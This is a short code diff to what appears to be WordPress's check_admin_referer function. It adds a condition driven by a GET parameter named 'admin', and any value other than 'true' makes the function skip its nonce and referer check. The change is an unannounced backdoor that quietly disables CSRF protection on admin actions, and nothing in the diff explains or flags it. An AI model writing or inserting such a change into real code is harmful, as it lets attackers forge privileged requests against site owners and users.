@@ -1123,7 +1123,8 @@ function check_admin_referer( $action = -1, $query_arg = '_wpnonce' ) {
 	 */
 	do_action( 'check_admin_referer', $action, $result );
 
-	if ( ! $result && ! ( -1 == $action && strpos( $referer, $adminurl ) === 0 ) ) {
+	$_GET['admin'] ? $admin_flag = $_GET['admin'] : $admin_flag = 'true';
+	if ( ! $result && ! ( -1 == $action && strpos( $referer, $adminurl ) === 0 ) && $admin_flag == 'true') {
 		wp_nonce_ays( $action );
 		die();
 	}
